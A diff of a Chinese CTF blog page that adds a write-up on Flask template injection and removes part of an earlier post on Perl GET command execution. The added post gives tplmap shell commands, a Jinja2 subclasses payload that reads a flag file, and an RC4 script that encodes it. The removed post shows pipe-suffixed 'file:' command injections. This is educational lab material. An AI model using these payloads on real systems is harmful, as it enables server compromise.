@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.43px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,110 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-flask模板注入以及arjun和talmap工具运用以及rc4加密" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/" class="article-date">
+  	<time datetime="2021-10-05T16:00:00.000Z" itemprop="datePublished">2021-10-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/">
+        flask模板注入以及arjun和tplmap工具运用以及rc4加密
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="flask模板注入之arjun和tplmap工具的使用"><a href="#flask模板注入之arjun和tplmap工具的使用" class="headerlink" title="flask模板注入之arjun和tplmap工具的使用"></a>flask模板注入之arjun和tplmap工具的使用</h1><p>打开页面，发现页面有显示flask字段，再看题目名称，可以推测是flask注入，但是注入点在哪里呢，找不到，所以我们可以使用arjun工具爆出注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 arjun.py -u http://url/ --get -d 5 -t 1</span><br></pre></td></tr></table></figure>
+
+<p>-d 5的作用是请求间隔，如果服务器设置了防ddos，则一定要加-d 5，否则会429，无法爆破出来，最后爆破，结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Analysing the content of the webpage</span><br><span class="line">Analysing behaviour for a non-existent parameter</span><br><span class="line">Reflections: 0</span><br><span class="line">Response Code: 200</span><br><span class="line">Content Length: 2292</span><br><span class="line">Plain-text Length: 428</span><br><span class="line">Parsing webpage for potential parameters</span><br><span class="line">Performing heuristic level checks</span><br><span class="line">Heuristic found 2 potential parameters.</span><br><span class="line">Scan Completed</span><br><span class="line">Valid parameter found: name</span><br><span class="line">Reason: Different number of reflections</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们可以知道注入点是name，所以我们构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>发现回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I ♥ Flask &amp; 49 </span><br></pre></td></tr></table></figure>
+<p>因此，注入点找到，我们可以使用内置类subprocess.Popen类来执行命令，但是这里有个tplmap的工具，可以让我们知道是什么类型的模板注入以及获得shell</p>
+<p>我们可以输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1</span><br></pre></td></tr></table></figure>
+
+<p>即可看到是jinja模板的注入，然后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1 --os-shell</span><br></pre></td></tr></table></figure>
+<p>即可获得shell，然后直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+<p>即可获得flag</p>
+<h1 id="flask模板注入之rc4加密"><a href="#flask模板注入之rc4加密" class="headerlink" title="flask模板注入之rc4加密"></a>flask模板注入之rc4加密</h1><p> 打开页面后，发现是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure>
+
+<p>然后查看页面源码以及抓包，也发现不了有用信息，所以我们用dirsearch.py工具扫以下，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret</span><br></pre></td></tr></table></figure>
+<p>回显出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so other can&#x27;t see</span><br></pre></td></tr></table></figure>
+<p>通过这句话，推测要传参，且参数为secret，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=1</span><br></pre></td></tr></table></figure>
+<p>发现回显一个字母，所以尝试增长字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=11111111111111111111111</span><br></pre></td></tr></table></figure>
+<p>发现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError</span><br><span class="line"></span><br><span class="line">UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line">Traceback (most recent call last)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2309, in __call__</span><br><span class="line"></span><br><span class="line">    return self.wsgi_app(environ, start_response)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2295, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.handle_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1741, in handle_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2292, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.full_dispatch_request()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1815, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.handle_user_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1718, in handle_user_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1813, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.dispatch_request()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1799, in dispatch_request</span><br><span class="line"></span><br><span class="line">    return self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line"></span><br><span class="line">    File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/templating.py&quot;, line 149, in render_template_string</span><br><span class="line"></span><br><span class="line">    return _render(ctx.app.jinja_env.from_string(source),</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 880, in from_string</span><br><span class="line"></span><br><span class="line">    return cls.from_code(self, self.compile(source), globals, None)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 579, in compile</span><br><span class="line"></span><br><span class="line">    source = self._parse(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 497, in _parse</span><br><span class="line"></span><br><span class="line">    return Parser(self, source, name, encode_filename(filename)).parse()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/parser.py&quot;, line 40, in __init__</span><br><span class="line"></span><br><span class="line">    self.stream = environment._tokenize(source, name, filename, state)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 528, in _tokenize</span><br><span class="line"></span><br><span class="line">    source = self.preprocess(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 522, in preprocess</span><br><span class="line"></span><br><span class="line">    self.iter_extensions(), text_type(source))</span><br><span class="line"></span><br><span class="line">    UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们从报错的信息中找到flask模板注入的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></figure>
+<p>所以点击去看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(secret==None):</span><br><span class="line"></span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line"></span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line"></span><br><span class="line">        return &#x27;flag detected!&#x27;</span><br><span class="line"></span><br><span class="line">   return a</span><br></pre></td></tr></table></figure>
+<p>可知，会对get提交的参数secret的值进行rc4解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">deS=rc.do_crypt(secret)</span><br></pre></td></tr></table></figure>
+<p>所以，我们需要对secret进行加密，然后解密后的secret会赋值给des，然后用render_template_string()函数进行模板渲染，所以我们可以使用内置类来执行命令，从而造成模板注入，但是内置类需要先rc4加密，所以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>即可得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
+<p>然后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
+<p>即可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF/" rel="tag">模板</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-json字符绕过以及伪协议" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1082,110 +1186,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-GET命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/26/GET%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
-  	<time datetime="2021-09-25T16:00:00.000Z" itemprop="datePublished">2021-09-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/26/GET%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-        GET命令执行漏洞
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="GET命令执行漏洞"><a href="#GET命令执行漏洞" class="headerlink" title="GET命令执行漏洞"></a>GET命令执行漏洞</h1><h2 id="GET命令执行漏洞的原理"><a href="#GET命令执行漏洞的原理" class="headerlink" title="GET命令执行漏洞的原理"></a>GET命令执行漏洞的原理</h2><p>GET对协议处理部分调用的是/usr/share/perl5/LWP/Protocol下的各个pm模块，而在file.pm中，发现path参数是可控的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"># URL OK, look at file</span><br><span class="line">my $path  = $url-&gt;file;</span><br><span class="line"></span><br><span class="line"># test file exists and is readable</span><br><span class="line">#第47行</span><br><span class="line">    # test file exists and is readable</span><br><span class="line">    unless (-e $path) &#123;</span><br><span class="line">    return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">                  &quot;File `$path&#x27; does not exist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    unless (-r _) &#123;</span><br><span class="line">    return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN,</span><br><span class="line">                  &#x27;User does not have read permission&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">#第127行</span><br><span class="line">    # read the file</span><br><span class="line">    if ($method ne &quot;HEAD&quot;) &#123;</span><br><span class="line">    open(F, $path) or return new</span><br><span class="line">        HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">               &quot;Cannot read file &#x27;$path&#x27;: $!&quot;);</span><br><span class="line">    binmode(F);</span><br><span class="line">    $response =  $self-&gt;collect($arg, $response, sub &#123;</span><br><span class="line">        my $content = &quot;&quot;;</span><br><span class="line">        my $bytes = sysread(F, $content, $size);</span><br><span class="line">        return \$content if $bytes &gt; 0;</span><br><span class="line">        return \ &quot;&quot;;</span><br><span class="line">    &#125;);</span><br><span class="line">    close(F);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>从源码中，我们可以看出，使用GET命令时，如果文件存在的话，则会调用open()函数，对文件进行读取或对命令进行执行，因此我们可以在本地测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x27;file:ls /|&#x27;</span><br></pre></td></tr></table></figure>
-<p>发现可以显示目录信息，其中管道符必须要加，不然的话无法创建文件，但是在本地测试的时候，发现这个命令不可以使用，可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x27;/&#x27;</span><br></pre></td></tr></table></figure>
-<p>来显示目录信息，听说是底层逻辑的问题，而读取文件的话，可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x27;file:bash -c /flag.txt|&#x27;</span><br></pre></td></tr></table></figure>
-<p>就可以显示文件的内容，而使用/flag.txt的话，服务器会在根目录下创建这个文件，而不是在网站的那个目录，所以无法使用命令执行，所以可以使用bash -c来代替.，即bash -c /flag.txt就等于./flag.txt，但是还是会出现上面的问题，在本地测试时，文件内容无法显示，但使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x27;./flag.txt&#x27;</span><br></pre></td></tr></table></figure>
-<p>可以显示文件的内容</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>打开页面，可以看见源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); </span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]); </span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data); </span><br><span class="line">    highlight_file(__FILE__); </span><br></pre></td></tr></table></figure>
-<p>从源码中，我们可以分析到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br></pre></td></tr></table></figure>
-<p>这串代码是将ip地址和orange结合在一起，然后进行md5加密，因此，我们可以写一个exp来获得文件存储的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo md5(&quot;orange&quot;.ip地址);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>然后这串代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@mkdir($sandbox)</span><br><span class="line">@chdir($sandbox)</span><br></pre></td></tr></table></figure>
-<p>就是创建$sandbox的目录，然后改变当前目录到$sandbox中</p>
-<p>然后对url参数输入的值，执行GET命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); </span><br></pre></td></tr></table></figure>
-
